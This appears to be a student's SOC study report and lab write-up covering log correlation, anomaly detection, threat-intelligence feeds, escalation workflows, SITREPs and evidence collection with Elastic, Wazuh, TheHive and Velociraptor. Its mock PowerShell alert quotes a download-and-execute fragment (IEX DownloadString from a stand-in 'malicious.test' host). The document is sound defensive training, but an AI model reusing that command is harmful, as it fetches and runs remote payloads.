
# Advanced SOC Theoretical Study Report

## 1. Advanced Log Analysis

### Introduction

Log analysis is one of the most important tasks in a Security Operations Center (SOC). Every device in an IT environment generates logs such as **firewalls, servers, endpoints, applications, and network devices**. These logs contain valuable information about user activity, system behavior, and potential security threats.

Advanced log analysis goes beyond simply viewing logs. It involves **correlating logs from different systems, detecting abnormal behavior, and enriching log data with additional context** to identify sophisticated cyber attacks.

The primary goal of advanced log analysis is to **detect security incidents early, reduce false positives, and understand attacker behavior**.

---

## 1.1 Log Correlation

### Definition

Log correlation is the process of **combining and analyzing logs from multiple sources to identify patterns that indicate malicious activity**.

Attackers often perform multiple steps when compromising a system. Each step may generate logs in different systems. By correlating these logs, security analysts can reconstruct the attack timeline.

### Example Scenario

An attacker attempts to gain access to a system.

Step 1: Multiple failed login attempts
Windows Security Log Event ID: **4625 (Failed Logon)**

Step 2: Successful login
Event ID: **4624 (Successful Logon)**

Step 3: Suspicious outbound connection detected in firewall logs.

Individually these logs might not look dangerous, but when correlated they may indicate:

**Brute force attack followed by system compromise and data exfiltration.**

### Types of Log Correlation

#### 1. Rule-Based Correlation

Predefined rules detect known attack patterns.

Example rule:

If
More than 5 failed logins within 1 minute
AND
A successful login occurs from the same IP

Trigger alert → **Possible Brute Force Attack**

#### 2. Time-Based Correlation

Events occurring within a specific time window are analyzed together.

Example:
Multiple authentication failures within **10 minutes**.

#### 3. Behavioral Correlation

Logs are analyzed to detect abnormal user behavior.

Example:
A user usually logs in between **9 AM – 6 PM** but suddenly logs in at **3 AM from another country**.

### Benefits of Log Correlation

• Detect multi-stage attacks
• Reduce false alerts
• Provide complete attack timeline
• Improve incident response

---

## 1.2 Anomaly Detection

### Definition

Anomaly detection identifies **unusual or abnormal activities that deviate from normal behavior**.

Instead of detecting only known attacks, anomaly detection helps identify **unknown threats and insider attacks**.

### Types of Anomalies

#### 1. Behavioral Anomalies

Unusual user behavior.

Example:
• Employee downloads **10 GB of data suddenly**
• User accesses sensitive files not normally accessed

#### 2. Network Anomalies

Unusual network activity.

Example:
• Large outbound traffic to unknown IP
• Unexpected communication with foreign servers

#### 3. System Anomalies

Changes in system behavior.

Example:
• CPU usage suddenly spikes
• New services start without authorization

### Detection Techniques

#### Rule-Based Detection

Uses predefined thresholds.

Example:
Alert if **data transfer exceeds 5 GB in 1 hour**.

#### Statistical Detection

Uses baseline behavior.

Example:
Normal login attempts = **2–3 per day**
Detected login attempts = **50 in 1 hour**

#### Machine Learning Detection

Advanced systems like **SIEM or UEBA** learn normal behavior and detect deviations automatically.

### Importance in SOC

• Detect unknown attacks
• Identify insider threats
• Discover compromised accounts
• Improve threat hunting capabilities

---

## 1.3 Log Enrichment

### Definition

Log enrichment is the process of **adding additional contextual information to raw logs** to make them easier to analyze.

Raw logs often lack sufficient information for analysts to make decisions.

Example raw log:

IP: 185.234.12.44 attempted login

This information alone does not tell if the IP is malicious.

After enrichment:

IP: 185.234.12.44
Country: Russia
Threat Reputation: Malicious
Associated Malware: C2 Server

### Types of Log Enrichment

#### Geolocation Enrichment

Adds geographic location to IP addresses.

Example:
IP → Country → City → ISP

#### Threat Intelligence Enrichment

Matches IPs, domains, or file hashes with threat databases.

Example sources:

• Malware databases
• Known botnet servers
• Command and control servers

#### Asset Enrichment

Adds internal asset information.

Example:

User: Admin
Department: Finance
Asset criticality: High

### Benefits of Log Enrichment

• Faster investigation
• Better threat context
• Improved alert prioritization
• Reduced analyst workload

---

# 2. Threat Intelligence Integration

## Introduction

Threat intelligence refers to **information about current and emerging cyber threats**. It helps security teams understand:

• Who the attackers are
• How they operate
• What systems they target

Integrating threat intelligence into SOC tools like SIEM enables **faster detection and proactive defense**.

---

## 2.1 Types of Threat Intelligence

### 1. Strategic Threat Intelligence

High-level information about cyber threats and attacker motivations.

Audience:
• Executives
• Security leadership

Example:
Reports on global ransomware trends.

---

### 2. Tactical Threat Intelligence

Focuses on **attacker tactics and techniques**.

Example:
Phishing techniques used by attackers.

Framework used:
**MITRE ATT&CK**

---

### 3. Operational Threat Intelligence

Information about **specific ongoing attacks**.

Example:

• Malware campaigns
• Active threat actors

---

### 4. Technical Threat Intelligence

Provides **Indicators of Compromise (IOCs)**.

Examples:

Malicious IP addresses
Malicious domains
File hashes
Command and control servers

Example IOC:

IP: 103.45.67.12
Hash: 9b74c9897bac770ffc029102a200c5de

---

## 2.2 Indicators of Compromise (IOCs)

IOCs are **forensic artifacts that indicate a system has been compromised**.

Examples:

• Suspicious IP address
• Malicious file hash
• Abnormal registry entry
• Suspicious domain

Example detection workflow:

Firewall log shows outbound connection to **known malicious IP**.

SIEM matches IP with threat intelligence feed → alert triggered.

---

## 2.3 Threat Intelligence Standards

### STIX (Structured Threat Information Expression)

A standardized format used to **share threat intelligence data**.

Example STIX information:

• Threat actors
• Malware types
• Attack techniques

---

### TAXII (Trusted Automated Exchange of Intelligence Information)

Protocol used to **automatically exchange threat intelligence between organizations**.

Example:

Security vendors share threat feeds with SIEM platforms.

---

## 2.4 Threat Hunting using Intelligence

Threat hunting is **proactively searching systems to find hidden threats**.

Threat intelligence helps analysts search for specific attacker techniques.

Example:

Technique: **Valid Accounts Misuse**

Attacker uses stolen credentials to access systems.

Threat hunt query:

Search logs for:

• Unusual login locations
• Logins outside working hours
• Multiple login failures followed by success

---

## Benefits of Threat Intelligence Integration

• Faster threat detection
• Proactive security monitoring
• Better understanding of attacker behavior
• Reduced investigation time

---

# 3. Incident Escalation Workflows

## Introduction

In a SOC environment, not all alerts require the same level of investigation. Incident escalation workflows ensure that **security incidents are handled by the appropriate expertise level**.

SOC teams are structured into **multiple tiers** based on experience and responsibilities.

---

## 3.1 SOC Tier Structure

### Tier 1: SOC Analyst (Alert Triage)

Responsibilities:

• Monitor SIEM alerts
• Perform initial investigation
• Validate whether alerts are false positives

Example tasks:

Check logs
Review IP reputation
Verify user activity

If suspicious activity is confirmed → escalate to Tier 2.

---

### Tier 2: SOC Analyst (Incident Investigation)

Responsibilities:

• Deep investigation
• Malware analysis
• Log correlation

Example tasks:

Analyze attack timeline
Identify affected systems
Contain the incident

If attack is complex → escalate to Tier 3.

---

### Tier 3: Threat Hunter / Incident Responder

Responsibilities:

• Advanced forensic analysis
• Root cause investigation
• Threat hunting

Example tasks:

Memory analysis
Reverse engineering malware
Identify attacker persistence methods

---

## 3.2 Escalation Criteria

Incidents are escalated based on:

### Severity

Example:

Low → Suspicious login
Medium → Malware detection
High → Data breach or ransomware

### Impact

Number of affected systems or users.

### Complexity

If the incident requires advanced analysis.

---

## 3.3 Communication Protocols

Effective communication is critical during incidents.

SOC teams use **structured reporting formats**.

### Situation Report (SITREP)

Typical SITREP includes:

Incident ID
Time detected
Description of incident
Affected systems
Actions taken
Recommended next steps

Example:

Incident: Multiple failed SSH login attempts
Affected server: Web Server 01
Action: IP blocked in firewall

---

## 3.4 Automation in Escalation

Security orchestration tools automate many SOC processes.

Examples:

• Ticket creation
• Alert enrichment
• Incident assignment

Automation tools are called **SOAR platforms**.

Example capabilities:

Automatic IP reputation check
Auto-block malicious IP
Auto-create incident ticket

---

## Benefits of Escalation Workflows

• Faster incident response

• Proper resource utilization

• Improved coordination between teams

• Reduced response time

---

Advanced Log Analysis Report
Objective
To correlate logs, detect anomalies, and enrich security data using Elastic Security and Security Onion for identifying suspicious activities like brute-force attacks and data exfiltration.
________________________________________
PART 1: LAB SETUP (Prerequisites)
Machines Required
•	Ubuntu (Elastic Stack installed) 
•	Security Onion OR any log source 
•	Kali Linux (for attack simulation) 
Tools Used
•	Elastic Security 
•	Security Onion 
•	Google Sheets (for reporting) 
________________________________________
 PART 2: INGEST LOGS INTO ELASTIC
Step 1: Start Elastic Stack
sudo systemctl start elasticsearch
sudo systemctl start kibana
Step 2: Install Elastic Agent
curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.x-linux-x86_64.tar.gz
tar xzvf elastic-agent-*.tar.gz
cd elastic-agent-*
sudo ./elastic-agent install
Step 3: Add Integration (Windows Logs / Sysmon)
•	Go to Kibana → Fleet → Integrations 
•	Add: 
o	Windows Event Logs OR Sysmon 
•	Ensure logs like Event ID 4625 are collected 
________________________________________
PART 3: LOG CORRELATION
Goal
Detect brute-force login attempts followed by outbound traffic
________________________________________
Step 1: Search Failed Logins (Event ID 4625)
Go to:
Kibana → Discover
Query:
event.code: "4625"
<img width="602" height="339" alt="image" src="https://github.com/user-attachments/assets/b3388cda-e752-4393-9641-6270dce72778" />

 
________________________________________

Step 2: Search Outbound Traffic
network.direction: "outbound"
________________________________________
Step 3: Correlate Both
Use combined query:
event.code: "4625" AND network.direction: "outbound"
________________________________________
Sample Correlated Log Table
Timestamp	Event ID	Source IP	Destination IP	Notes
2025-08-18 12:00:00	4625	192.168.1.100	8.8.8.8	Suspicious DNS request
2025-08-18 12:01:10	4625	192.168.1.100	45.33.32.156	Possible C2 traffic
2025-08-18 12:02:30	4625	192.168.1.100	104.21.x.x	Data exfil attempt
________________________________________
PART 4: ANOMALY DETECTION RULE
Goal
Detect high data transfer (possible exfiltration)
________________________________________
Step 1: Create Detection Rule
Go to:
Kibana → Security → Rules → Create Rule
Choose:
•	Custom Query Rule 
<img width="1352" height="638" alt="Screenshot (106)" src="https://github.com/user-attachments/assets/4a77c5ca-4db4-4315-a160-3ceb12bf8cea" />

________________________________________
Step 2: Rule Configuration
Query:
network.bytes_out > 1000000
Conditions:
•	Time window: 1 minute 
•	Threshold: > 1MB 
<img width="1360" height="651" alt="Screenshot (107)" src="https://github.com/user-attachments/assets/6d74fad5-da33-4867-a1c2-2c2c81b3ba82" />

________________________________________
Step 3: Rule Settings
•	Rule Name: High Data Transfer Detection 
•	Severity: High 
•	Risk Score: 80 

<img width="1359" height="639" alt="Screenshot (108)" src="https://github.com/user-attachments/assets/f692b8b3-b138-4ef9-bf6a-2e88414d4a89" />

________________________________________

PART 5: LOG ENRICHMENT (GeoIP)
Goal
Add location info to IP addresses
________________________________________
Step 1: Enable GeoIP Processor
Edit pipeline:
sudo nano /etc/elasticsearch/elasticsearch.yml
Ensure:
ingest.geoip.downloader.enabled: true
________________________________________
Step 2: Add GeoIP in Ingest Pipeline
Go to:
 Kibana → Stack Management → Ingest Pipelines

 <img width="602" height="289" alt="image" src="https://github.com/user-attachments/assets/d79dbc4f-9f15-4930-ab97-1cc1961a693a" />


Add processor:

 <img width="602" height="289" alt="image" src="https://github.com/user-attachments/assets/babe17ef-3cde-4a5d-b51d-7eafb599d819" />

________________________________________
Example Enriched Output
IP Address	Country	City
8.8.8.8	USA	Mountain View
45.33.32.156	USA	Newark
________________________________________
📝 PART 6: 50-WORD SUMMARY 
Log analysis revealed repeated failed logins followed by outbound connections, indicating a possible brute-force attack and data exfiltration attempt. Anomaly detection identified high data transfer activity. GeoIP enrichment provided attacker location context, improving threat visibility and enabling faster incident response and mitigation.

---



2. Threat Intelligence Integration
Activities:
Tasks: Import threat feeds, enrich alerts, and hunt for threats.

Enhanced Tasks:
 <img width="1331" height="693" alt="Screenshot (109)" src="https://github.com/user-attachments/assets/e290fae8-5746-4bbd-8bfc-17639b6298e0" />

Download malicious domains data from the AlienVault.
 
 
Convert data to the json format and Upload JSON data to the Elasticsearch
 
 <img width="1091" height="600" alt="Screenshot (114)" src="https://github.com/user-attachments/assets/ded221ce-7e18-4b3b-9fbf-dcab89242ae8" />

<img width="1064" height="606" alt="Screenshot (115)" src="https://github.com/user-attachments/assets/e4fa667d-9a34-4a72-a469-fae606c040ea" />

Verify the data uploaded successfully

Create Correlation Rule:
 <img width="1075" height="568" alt="Screenshot (116)" src="https://github.com/user-attachments/assets/b679f0a1-aca6-42b0-9a8e-8094fd13ac6a" />

Rule created for the malicious IP from AlienVault feed.
 <img width="1073" height="550" alt="Screenshot (117)" src="https://github.com/user-attachments/assets/f5c6fae8-5478-4a10-b2d9-c485125c1cb3" />

The rule trigger for c2 malicious IP.
 <img width="1084" height="558" alt="Screenshot (118)" src="https://github.com/user-attachments/assets/bfa56ff3-b02e-461d-8161-5e5fb0a30ee8" />


Alert ID	IP	Reputation	Notes
001	185.244.172.155	Malicious (OTX)	Matched with DarkComet Command and Control in threat-intel index. Triggered rule “Threat Intel Match – C2”.


 <img width="1081" height="583" alt="Screenshot (119)" src="https://github.com/user-attachments/assets/bf8c63db-7205-49a6-9888-d1c395a55861" />

It show that 12 successful login are recorded.

 <img width="1065" height="593" alt="Screenshot (120)" src="https://github.com/user-attachments/assets/97164f6b-a72f-49c3-93b7-defec9f85108" />


You’ve found 12 valid logons that weren’t system-generated — these could be normal user logons.


Summary:
The Wazuh hunt for MITRE T1078 (Valid Accounts) using query data.win.system.eventID:4624 AND NOT data.win.eventdata.subjectUserName:"SYSTEM" identified 12 successful logons from non-system accounts. These logons indicate valid user authentications, potentially including local or remote access, useful for detecting unauthorized credential use or lateral movement attempts.




3. Incident Escalation Practice
Activities:
Tasks: Simulate escalation, draft SITREPs, and automate workflows.
Create a TheHive case for a High-priority alert (e.g., unauthorized access):
 <img width="1248" height="671" alt="Screenshot (121)" src="https://github.com/user-attachments/assets/16838133-365f-4f82-bbab-feec77123fa0" />

 <img width="1245" height="670" alt="Screenshot (122)" src="https://github.com/user-attachments/assets/63675845-5c0f-448a-b664-1ed088a0c7e9" />

<img width="1139" height="613" alt="Screenshot (123)" src="https://github.com/user-attachments/assets/115498af-d921-4899-a697-edf099446582" />
 
All task added successfully in the case.

SITREP Draft: Write a Situation Report in Google Docs for a mock incident

Unauthorized Access on Server-Y

Section									Details
Summary									Detected at 2025-08-18 13:00, IP: 192.168.1.200, MITRE T1078
Actions Taken							Isolated server, escalated to Tier 2
Next Steps								Tier 2 investigation, log review, user verification
Prepared By								SOC Analyst
Date									2025-08-18


4. Alert Triage with Threat Intelligence
Activities:
Tasks: Triage alerts and validate IOCs using threat intelligence.

 <img width="1464" height="355" alt="Screenshot (124)" src="https://github.com/user-attachments/assets/b0df7f25-1d5a-42f8-b3ba-a1c4c7c1a2af" />


Mock alert creation Suspicious PowerShell Execution 
 
 <img width="1338" height="675" alt="Screenshot (125)" src="https://github.com/user-attachments/assets/ee56c1f1-0738-4fb1-bf2b-9911c9211fe5" />

<img width="1086" height="586" alt="Screenshot (126)" src="https://github.com/user-attachments/assets/5d86aad1-2755-42df-9750-1683808eb0e9" />

Alert successfully show in Wazuh.

Alert ID		Description									Priority	Status
004 / 91837		PowerShell ScriptBlock execution (EventID 4104) — IEX ...DownloadString('http://malicious.test/payload.ps1')	192.168.0.128	Medium (Wazuh level 4 → escalate if external)	Open

IOC validation :
	Indicator Investigated: 192.168.0.128
	Sources Used : Virus Total and AlienVault
 
<img width="1086" height="535" alt="Screenshot (127)" src="https://github.com/user-attachments/assets/af3f6abf-3d51-4c36-854f-3dd4d19ff6fe" />
 
<img width="1092" height="585" alt="Screenshot (128)" src="https://github.com/user-attachments/assets/ec6f4ddb-a456-4fbd-9680-92e515922246" />

Result:

•	VirusTotal: No malicious detections (0/95 engines flagged).

•	AlienVault OTX: No active pulses or threat associations.

•	Conclusion: Internal IP (likely a lab endpoint). No known malicious reputation.

Summary:

The alert indicated a suspicious PowerShell execution involving a potential IEX DownloadString command. IOC analysis of IP 192.168.0.128 on VirusTotal and AlienVault OTX returned no known malicious activity. The IP appears to belong to an internal test machine, suggesting a benign event within the controlled lab environment.


5. Evidence Preservation and Analysis

Tasks: Collect and preserve evidence, maintain chain-of-custody.

Volatile Data Collection:
	Use Velociraptor to collect network connections
 
 <img width="1096" height="527" alt="Screenshot (129)" src="https://github.com/user-attachments/assets/51783cdf-fb1c-4c31-8a52-b1c0b1b33f9f" />

<img width="1103" height="496" alt="Screenshot (130)" src="https://github.com/user-attachments/assets/17a38719-b18b-4e0f-a268-ea3162f53741" />

We successfully collected network connections from windows VM and saved it to the .csv file.
<img width="1389" height="268" alt="Screenshot (131)" src="https://github.com/user-attachments/assets/68715e23-6587-4457-bba5-3cd04e0ba2fa" />

 
Collect a memory dump:
 	SELECT * FROM Artifact.Windows.Memory.Acquisition
 <img width="1395" height="572" alt="Screenshot (132)" src="https://github.com/user-attachments/assets/d25bca66-2a45-4b80-87a1-ebd85d5ae9fc" />

 <img width="1310" height="598" alt="Screenshot (133)" src="https://github.com/user-attachments/assets/20a9802e-72ae-48f7-99aa-7960d448658e" />

We successfully collected memory dump from windows VM.
 
<img width="1286" height="404" alt="Screenshot (134)" src="https://github.com/user-attachments/assets/42b10f49-56ca-4b7e-a028-7ba8f7cfca0e" />





Chain Of Custody:
Item        	Description        	Collected By  	Date        	Hash Value        

Netstat CSV	Netstat output (Velociraptor)	SOC Analyst	2025-11-13 T10:00:36.978Z	03EF9AD70668EAA46D787365686240143FE6296A2B9AA27D4094406786DAD3C8
Memory Dump	Server-Y Dump	SOC Analyst	2025-11-13 T10:16:36.453Z	BF45BE3F14E8B6824D99635106E679FA5ED8816BBE8B0CFC939D9AF55FF98107
